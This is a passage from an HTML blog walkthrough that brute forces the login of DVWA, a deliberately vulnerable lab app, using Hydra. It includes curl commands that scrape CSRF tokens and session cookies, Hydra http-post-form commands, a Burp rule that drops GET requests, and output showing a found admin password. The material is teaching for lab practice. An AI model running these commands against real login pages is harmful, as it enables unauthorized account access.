&lt;/span&gt;&lt;span class="line"&gt;/DVWA/login.php:username&lt;span class="o"&gt;=&lt;/span&gt;^USER^&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;^PASS^&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;user_token&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;Login&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Login:F&lt;span class="o"&gt;=&lt;/span&gt;Location&lt;span class="se"&gt;\:&lt;/span&gt; login.php:C&lt;span class="o"&gt;=&lt;/span&gt;:H&lt;span class="o"&gt;=&lt;/span&gt;Cookie: &lt;span class="nv"&gt;security&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;impossible&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SESSIONID&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;strong&gt;This is why testing and debugging locally before doing it is very useful (and how to debug an issue)&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Hydra itself does have an inbuilt debug option. However, it is either on or off, and when it is on, it throws a lot of data to the screen, making it harder to see what is going on.&lt;/p&gt;

&lt;p&gt;This is why I opted to use a proxy and use that to filter the requests. Please note, by adding the use of a Proxy - it is an extra part, making the attack more complex and it is another point of failure as it can make more issues.... See below.&lt;/p&gt;

&lt;p&gt;The up side of using a proxy with Hydra, if adding &lt;code&gt;C=/404.php&lt;/code&gt; does not fix the issue, is that we can create a proxy rule to "drop" any GET requests going to &lt;code&gt;/DVWA/login.php&lt;/code&gt; (e.g. &lt;code&gt;GET /DVWA/login.php.*$&lt;/code&gt;).&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;I made a mistake the first time I did this, as I started off doing &lt;code&gt;C=404.php&lt;/code&gt; (rather than &lt;code&gt;C=/404.php&lt;/code&gt;), however, this is incorrect. Missing the leading request will cause some interesting results.&lt;/p&gt;

&lt;p&gt;Note, Burp (by default) did not show up the error response, as it was being piped to an incorrect port (&lt;code&gt;80443.php&lt;/code&gt;)!&lt;/p&gt;

&lt;p&gt;&lt;img alt="Additional GET Requests with Burp" src="https://blog.g0tmi1k.com/images/dvwa-login-12.png" /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Issue..2..Missing.Parameters.Proxying.Hydra."&gt;&lt;/a&gt;
&lt;h4&gt;Issue #2 (Missing Parameters/Proxying Hydra)&lt;/h4&gt;

&lt;p&gt;This happened later on when doing the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;brute force module&lt;/a&gt;, using the &lt;code&gt;http-get-form&lt;/code&gt; instead of &lt;code&gt;http-post-form&lt;/code&gt;, so I will not go into too much detail now. Again, when using Burp, I noticed the GET parameters were not containing the values which were set. Even though this command is completely wrong for doing this attack, I want to show the issue.&lt;/p&gt;

&lt;p&gt;&lt;img alt="Missing Parameters" src="https://blog.g0tmi1k.com/images/dvwa-login-13.png" /&gt;&lt;/p&gt;

&lt;p&gt;Notice how Burp does not see the parameters? And they are also not in the web log?&lt;/p&gt;

&lt;p&gt;There are three solutions for this:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Disable using a proxy (&lt;code&gt;unset HYDRA_PROXY_HTTP&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Use a different proxy - ZAP works out of the box.&lt;/li&gt;
&lt;li&gt;Enable "invisible proxy mode" in Burp.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;img alt="Invisible Proxy Mode" src="https://blog.g0tmi1k.com/images/dvwa-login-14.png" /&gt;&lt;/p&gt;

&lt;p&gt;As this does not affect us for the time being, I will cover this in the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;brute force module&lt;/a&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Switching.from.Blacklisting.to.Whitelisting"&gt;&lt;/a&gt;
&lt;h3&gt;Switching from Blacklisting to Whitelisting&lt;/h3&gt;

&lt;p&gt;Rather than looking for "if the response does NOT include the following value, it must be a valid login" (blacklisting - x cannot equal y), it is smarter to look for certain values in the response (whitelisting - x must equal y).&lt;/p&gt;

&lt;p&gt;Let's switch back to cURL quickly, and see what a valid login looks like.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 192.168.1.33/DVWA/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -i -b dvwa.cookie -d &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; 192.168.1.33/DVWA/login.php&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;HTTP/1.1 &lt;span class="m"&gt;302&lt;/span&gt; Found
&lt;/span&gt;&lt;span class="line"&gt;Date: Thu, &lt;span class="m"&gt;15&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; 20:32:34 GMT
&lt;/span&gt;&lt;span class="line"&gt;Server: Apache/2.4.10 &lt;span class="o"&gt;(&lt;/span&gt;Win32&lt;span class="o"&gt;)&lt;/span&gt; OpenSSL/1.0.1h PHP/5.4.31
&lt;/span&gt;&lt;span class="line"&gt;X-Powered-By: PHP/5.4.31
&lt;/span&gt;&lt;span class="line"&gt;Expires: Thu, &lt;span class="m"&gt;19&lt;/span&gt; Nov &lt;span class="m"&gt;1981&lt;/span&gt; 08:52:00 GMT
&lt;/span&gt;&lt;span class="line"&gt;Cache-Control: no-store, no-cache, must-revalidate, post-check&lt;span class="o"&gt;=&lt;/span&gt;0, pre-check&lt;span class="o"&gt;=&lt;/span&gt;0
&lt;/span&gt;&lt;span class="line"&gt;Pragma: no-cache
&lt;/span&gt;&lt;span class="line"&gt;Location: index.php
&lt;/span&gt;&lt;span class="line"&gt;Content-Length: 0
&lt;/span&gt;&lt;span class="line"&gt;Content-Type: text/html
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -i -b dvwa.cookie -d &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; 192.168.1.33/DVWA/login.php | grep Location&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Location: index.php
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -i -b dvwa.cookie -d &amp;quot;username=admin&amp;amp;password=incorrect&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; 192.168.1.33/DVWA/login.php | grep Location&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Location: login.php
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Location, Location, Location" src="https://blog.g0tmi1k.com/images/dvwa-login-16.png" /&gt;&lt;/p&gt;

&lt;p&gt;The key bit here is &lt;code&gt;Location: index.php&lt;/code&gt;. So now let's put it into Hydra.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;Before &lt;span class="o"&gt;(&lt;/span&gt;Blacklistning&lt;span class="o"&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;F&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Location&lt;span class="se"&gt;\:&lt;/span&gt; login.php
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;After &lt;span class="o"&gt;(&lt;/span&gt;Whitelistning&lt;span class="o"&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;S&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Location&lt;span class="se"&gt;\:&lt;/span&gt; index.php
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;All we had to-do was just escape the colon.&lt;/p&gt;

&lt;p&gt;Once again, quick test to make sure it is correct. So after replacing the section from above, the &lt;code&gt;-v&lt;/code&gt; was also removed as we did not want to see when we were being redirected any more.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 192.168.1.33/DVWA/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# rm -f hydra.restore; export HYDRA_PROXY_HTTP=http://127.0.0.1:8080&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# hydra -l admin -p password -e ns -u -F -t 1 -w 10 -W 1 -V 192.168.1.33 http-post-form &amp;quot;/DVWA/login.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;user_token=${CSRF}&amp;amp;Login=Login:S=Location\: index.php:C=/404.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra v8.1 &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span class="k"&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class="k"&gt;for&lt;/span&gt; illegal purposes.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; starting at 2015-10-15 21:35:50
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; Using HTTP Proxy: http://127.0.0.1:8080
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFORMATION&lt;span class="o"&gt;]&lt;/span&gt; escape sequence &lt;span class="se"&gt;\:&lt;/span&gt; detected in module option, no parameter verification is performed.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; max &lt;span class="m"&gt;1&lt;/span&gt; task per &lt;span class="m"&gt;1&lt;/span&gt; server, overall &lt;span class="m"&gt;64&lt;/span&gt; tasks, &lt;span class="m"&gt;3&lt;/span&gt; login tries &lt;span class="o"&gt;(&lt;/span&gt;l:1/p:3&lt;span class="o"&gt;)&lt;/span&gt;, ~0 tries per task
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; attacking service http-post-form on port 80
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.33 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.33 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;2&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.33 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;3&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; target completed, &lt;span class="m"&gt;0&lt;/span&gt; valid passwords found
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; finished at 2015-10-15 21:36:29
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Unwanted GET Request" src="https://blog.g0tmi1k.com/images/dvwa-login-17.png" /&gt;&lt;/p&gt;

&lt;p&gt;Ugh, Hydra is making a GET request now after the POST request... again! Looks like adding the &lt;code&gt;C=/404.php&lt;/code&gt; did not fix it after all! (This is why it is worth only changing one thing at once and doing lots of little baby steps, rather than jumping straight into trying to brute force it).&lt;/p&gt;

&lt;p&gt;Even adding &lt;code&gt;-v&lt;/code&gt; back in, so the only thing that was different is the black/white listing, did not fix it. Switching back to the blacklisting, everything works again. So the issue is with &lt;code&gt;S=Location\: index.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Okay, so what happens if we do both &lt;code&gt;F=Location\: login.php&lt;/code&gt; and &lt;code&gt;S=Location\: index.php&lt;/code&gt;? Nope, that did not fix it (caused Hydra not to send out any requests). What happens if we try the order the other way around? Same, Hydra was not brute forcing.&lt;/p&gt;

&lt;p&gt;Plan B; let's make a Burp rule to drop any GET requests (as we really want to use Hydra)!&lt;/p&gt;

&lt;p&gt;Burp Proxy -&gt; Proxy -&gt; Options -&gt; Match and Replace -&gt; Add&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;Type: &lt;span class="sb"&gt;`&lt;/span&gt;Request header&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Match: &lt;span class="sb"&gt;`&lt;/span&gt;^GET /DVWA/login.php&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Replace: &lt;span class="sb"&gt;`&lt;/span&gt;/HEAD&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Comment: &lt;span class="sb"&gt;`&lt;/span&gt;DVWA - Hydra brute force login&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Regex match: Ticked
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Match and Replace" src="https://blog.g0tmi1k.com/images/dvwa-login-18-5.png" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note, using different values in the "replace" field, will have a different effect depending on the web server. See "Match and Replace" section below.&lt;/em&gt;&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# rm -f hydra.restore; export HYDRA_PROXY_HTTP=http://127.0.0.1:8080&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 192.168.1.33/DVWA/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# hydra -l admin -p password -e ns -u -F -t 1 -w 10 -W 1 -V 192.168.1.33 http-post-form &amp;quot;/DVWA/login.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;user_token=${CSRF}&amp;amp;Login=Login:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra v8.1 &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span class="k"&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class="k"&gt;for&lt;/span&gt; illegal purposes.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; starting at 2015-10-15 21:51:22
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; Using HTTP Proxy: http://127.0.0.1:8080
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFORMATION&lt;span class="o"&gt;]&lt;/span&gt; escape sequence &lt;span class="se"&gt;\:&lt;/span&gt; detected in module option, no parameter verification is performed.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; max &lt;span class="m"&gt;1&lt;/span&gt; task per &lt;span class="m"&gt;1&lt;/span&gt; server, overall &lt;span class="m"&gt;64&lt;/span&gt; tasks, &lt;span class="m"&gt;3&lt;/span&gt; login tries &lt;span class="o"&gt;(&lt;/span&gt;l:1/p:3&lt;span class="o"&gt;)&lt;/span&gt;, ~0 tries per task
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; attacking service http-post-form on port 80
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.33 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.33 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;2&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.33 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;3&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;80&lt;span class="o"&gt;][&lt;/span&gt;http-post-form&lt;span class="o"&gt;]&lt;/span&gt; host: 192.168.1.33   login: admin   password: password
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;STATUS&lt;span class="o"&gt;]&lt;/span&gt; attack finished &lt;span class="k"&gt;for&lt;/span&gt; 192.168.1.33 &lt;span class="o"&gt;(&lt;/span&gt;valid pair found&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; target successfully completed, &lt;span class="m"&gt;1&lt;/span&gt; valid password found
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; finished at 2015-10-15 21:51:50
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


